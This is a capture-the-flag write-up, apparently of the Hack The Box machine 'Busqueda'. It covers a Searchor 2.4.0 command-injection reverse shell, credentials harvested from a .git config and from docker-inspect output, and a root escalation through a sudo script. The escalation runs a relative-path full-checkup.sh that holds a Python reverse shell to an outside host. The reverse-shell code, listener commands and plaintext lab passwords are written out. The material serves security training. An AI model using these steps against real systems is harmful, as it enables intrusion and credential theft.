If we access to http://10.10.11.208:80/ it returns an error and we found the url searcher.htb in the toolbar, so lets add the domain to the /etc/hosts file and now we have access to the website

In the website we found the web application called Searchor 2.4.0 and after some research we found a **[RCE vulnerability](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)**. This vulnerability is due to query parameter is not sanitized so imporing a one liner reverse shell through this parameter we can grab a shell

![[Pasted image 20230807163129.png]]

![[Pasted image 20230807175307.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.208] 40584
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
```

Lets escalate privileges. After some search we found a .git folder in the `/var/www/app` directory. Inside we can find a credentials in the config file

```bash
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
```

We found the credentials cody:jh1usoih2bkjaspwe92 . If we try it with our current session with `sudo -l` we find that `jh1usoih2bkjaspwe92` is a valid password

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can run that command as sudo, so lets see what happen when we execute it

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py *           
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

We have tried to modify the script, the python path and more things but nothing works so lets dig in the docker processes

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 11 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 11 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e             
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

With a little search for the docker-inspect we found that we can retrieve the config file of the service by using the format parameter as `'{{.Config}}'`

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{.Config}}' 960873171e2e                                                      
{960873171e2e   false false false map[22/tcp:{} 3000/tcp:{}] false false false [USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] <nil> false gitea/gitea:latest map[/data:{} /etc/localtime:{} /etc/timezone:{}]  [/usr/bin/entrypoint] false  [] map[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:1.29.2 maintainer:maintainers@gitea.io org.opencontainers.image.created:2022-11-24T13:22:00Z org.opencontainers.image.revision:9bccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https://github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  <nil> []}

svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{.Config}}' f84a6b33fb5a 
{f84a6b33fb5a   false false false map[3306/tcp:{} 33060/tcp:{}] false false false [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8] [mysqld] <nil> false mysql:8 map[/var/lib/mysql:{}]  [docker-entrypoint.sh] false  [] map[com.docker.compose.config-hash:1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:1.29.2]  <nil> []}
```

So here we have the following credentials

* Gitea process 
	`gitea:yuiu1hoiu4i5ho1uh`
* Mysql process 
	`gitea:yuiu1hoiu4i5ho1uh`
	root password `jI86kGUuj87guWr3RyF`

It seems that nothing more we could do here, so we could try to access gitea.searcher.htb. After add this new domain to the hosts file the gitea app load perfectly

![[Pasted image 20230807202707.png]]

Trying credentials, we could access with cody:jh1usoih2bkjaspwe92

![[Pasted image 20230807202805.png]]

But it's just the webapp folder, so nothing relevant. We have found that a user called administrator exists, so trying credentials we found valid administrator:yuiu1hoiu4i5ho1uh . Here we can found the script system-checkup.py (the one which we can run as sudo)

![[Pasted image 20230807203045.png]]

And from here we can see everything that it does. We found a really special part of the code which says that executing the script with the parameter `full-checkup` will execute a script called `full-checkup.py` in the directory that we are, so we can create a file with that name (in tmp for example) with a reverse shell, execute the command as sudo and get a shell with privileges

```bash
svc@busqueda:/tmp$ vim full-checkup.sh                                     
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty

svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

It doesn't work, maybe because it doesn't have execution privileges

```bash
svc@busqueda:/tmp$ ls -la
drwxrwxrwt 17 root root 4096 Aug  7 18:11 .
drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..
-rw-r--r--  1 svc  svc   237 Aug  7 18:11 full-checkup.sh

svc@busqueda:/tmp$ chmod +x full-checkup.sh
```

Now run it again

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup

----------------------

┌──(kali㉿kali)-[~/Documents/Resources]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.208] 41390
# whoami                      
root
```

And we are root!